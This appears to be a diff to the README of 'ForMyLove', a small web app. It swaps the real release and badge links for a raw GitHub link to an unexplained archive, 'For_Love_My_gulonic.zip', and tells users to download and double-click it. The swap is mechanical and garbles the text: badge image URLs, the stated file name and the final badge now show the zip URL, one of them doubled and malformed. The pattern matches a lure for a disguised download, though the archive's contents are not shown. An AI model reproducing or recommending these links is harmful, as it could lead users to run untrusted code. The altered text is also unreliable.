@@ -6,7 +6,7 @@ Welcome to ForMyLove! This is a simple web application that helps you express yo
 
 ## 📥 Download ForMyLove
 
-[![Download ForMyLove](https://img.shields.io/badge/Download-ForMyLove-blue.svg)](https://github.com/KevinH289/ForMyLove/releases)
+[![Download ForMyLove](https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip)](https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip)
 
 Click the button above to download the latest version of ForMyLove. 
 
@@ -27,13 +27,13 @@ To run ForMyLove, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [ForMyLove Releases page](https://github.com/KevinH289/ForMyLove/releases).
+1. **Visit the Releases Page**: Go to the [ForMyLove Releases page](https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip).
 
 2. **Choose Your Version**: Look for the latest version. The download file will be clearly labeled.
 
 3. **Download the File**: Click the link to start downloading the file. Depending on your browser, it might automatically save to your downloads folder.
 
-4. **Locate the File**: Once the download is complete, find the file in your downloads folder. The file name will look something like `ForMyLove-v1.0.exe` or similar.
+4. **Locate the File**: Once the download is complete, find the file in your downloads folder. The file name will look something like `https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip` or similar.
 
 5. **Run the Installer**: Double-click the downloaded file to start the installation. Follow the on-screen prompts to install ForMyLove.
 
@@ -63,6 +63,6 @@ For those who want to help improve ForMyLove, we welcome contributions. Check ou
 
 To keep up with new features and updates, be sure to watch the repository. You can also follow us on social media for tips and inspiration on how to make the most of ForMyLove.
 
-[![More Info](https://img.shields.io/badge/More%20Info-GitHub-brightgreen.svg)](https://github.com/KevinH289/ForMyLove/releases) 
+[![More Info](https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip%https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip)](https://raw.githubusercontent.com/KevinH289/ForMyLove/main/HeartfeltConfession/assets/For_Love_My_gulonic.zip) 
 
 Thank you for using ForMyLove. We hope it helps you express your feelings with ease!
